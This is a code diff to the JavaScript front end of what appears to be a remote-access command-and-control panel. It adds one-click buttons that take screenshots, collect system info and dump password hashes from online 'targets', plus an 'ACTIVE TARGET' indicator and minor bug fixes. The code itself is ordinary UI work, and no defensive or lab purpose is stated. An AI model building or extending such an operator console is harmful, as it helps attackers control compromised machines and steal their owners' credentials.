@@ -274,6 +274,23 @@ async function loadConnections() {
                 ? new Date(conn.connected_at).toLocaleString() 
                 : 'N/A';
             
+            const quickActions = conn.status === 'online' ? `
+                <div class="quick-actions" onclick="event.stopPropagation();">
+                    <button class="quick-btn" onclick="selectConnection('${conn.id}', '${conn.hostname}', '${conn.status}'); showSection('commands'); executeCommand('sysinfo');" title="Get full system info">
+                        📊 Info
+                    </button>
+                    <button class="quick-btn" onclick="selectConnection('${conn.id}', '${conn.hostname}', '${conn.status}'); showSection('commands'); executeCommand('screenshot');" title="Capture screenshot">
+                        📸 Screen
+                    </button>
+                    <button class="quick-btn" onclick="selectConnection('${conn.id}', '${conn.hostname}', '${conn.status}'); showSection('commands'); executeCommand('hashdump');" title="Dump password hashes">
+                        🔑 Hashes
+                    </button>
+                    <button class="quick-btn" onclick="selectConnection('${conn.id}', '${conn.hostname}', '${conn.status}'); showSection('commands');" title="Open command panel">
+                        ⚡ Commands
+                    </button>
+                </div>
+            ` : '';
+            
             return `
                 <div class="connection-card ${statusClass} ${selectedClass}" 
                      onclick="selectConnection('${conn.id}', '${conn.hostname}', '${conn.status}')">
@@ -287,6 +304,7 @@ async function loadConnections() {
                         ${conn.status === 'online' ? `<p><strong>Last Seen:</strong> ${lastSeen}</p>` : ''}
                         ${conn.status === 'online' ? `<p><strong>Connected:</strong> ${connectedAt}</p>` : ''}
                     </div>
+                    ${quickActions}
                 </div>
             `;
         }).join('');
@@ -307,24 +325,26 @@ function selectConnection(id, hostname, status) {
     // Update UI
     loadConnections(); // Refresh to show selection
     
-    // Update command section
+    // Update command section info
     const infoDiv = document.getElementById('selectedConnectionInfo');
     if (status === 'online') {
         infoDiv.innerHTML = `
-            <strong>✅ Selected Connection:</strong> ${hostname} (${id}) - ONLINE<br>
-            <em>You can now execute commands on this target</em>
+            <strong>✅ Selected Target:</strong> ${hostname} (${id}) - ONLINE<br>
+            <em>Ready for command execution - Switch to Commands tab</em>
         `;
         infoDiv.style.borderColor = 'var(--success)';
-        showToast(`Selected ${hostname}`, 'success');
-        showSection('commands');
+        showToast(`✓ Target selected: ${hostname} - Ready for commands`, 'success');
     } else {
         infoDiv.innerHTML = `
-            <strong>⚫ Selected Connection:</strong> ${hostname} (${id}) - OFFLINE<br>
+            <strong>⚫ Selected Target:</strong> ${hostname} (${id}) - OFFLINE<br>
             <em>⚠️ This connection is offline. Commands cannot be executed.</em>
         `;
         infoDiv.style.borderColor = 'var(--warning)';
-        showToast(`${hostname} is offline`, 'warning');
+        showToast(`⚠️ ${hostname} is offline - Cannot execute commands`, 'warning');
     }
+    
+    // Update persistent target indicator in nav
+    updateTargetIndicator(hostname, status);
 }
 
 function showCommands(category) {
@@ -332,13 +352,18 @@ function showCommands(category) {
     document.querySelectorAll('.cat-btn').forEach(btn => {
         btn.classList.remove('active');
     });
-    event.target.classList.add('active');
+    if (event && event.target) {
+        event.target.classList.add('active');
+    }
     
     // Update command groups
     document.querySelectorAll('.command-group').forEach(group => {
         group.classList.remove('active');
     });
-    document.getElementById(`${category}Commands`).classList.add('active');
+    const targetGroup = document.getElementById(`${category}Commands`);
+    if (targetGroup) {
+        targetGroup.classList.add('active');
+    }
 }
 
 async function executeCommand(command) {
@@ -973,4 +998,25 @@ function changePageSize(loadFunction, newSize) {
         filesPagination.currentPage = 1;
         loadFiles();
     }
+}
+
+// Update persistent target indicator in navigation
+function updateTargetIndicator(hostname, status) {
+    let indicator = document.getElementById('targetIndicator');
+    if (!indicator) {
+        // Create indicator if it doesn't exist
+        const sidebar = document.querySelector('.sidebar-footer');
+        indicator = document.createElement('div');
+        indicator.id = 'targetIndicator';
+        indicator.className = 'target-indicator';
+        sidebar.insertBefore(indicator, sidebar.firstChild);
+    }
+    
+    const statusIcon = status === 'online' ? '🎯' : '⚫';
+    const statusClass = status === 'online' ? 'online' : 'offline';
+    indicator.className = `target-indicator ${statusClass}`;
+    indicator.innerHTML = `
+        <div class="indicator-label">ACTIVE TARGET</div>
+        <div class="indicator-value">${statusIcon} ${hostname}</div>
+    `;
 }
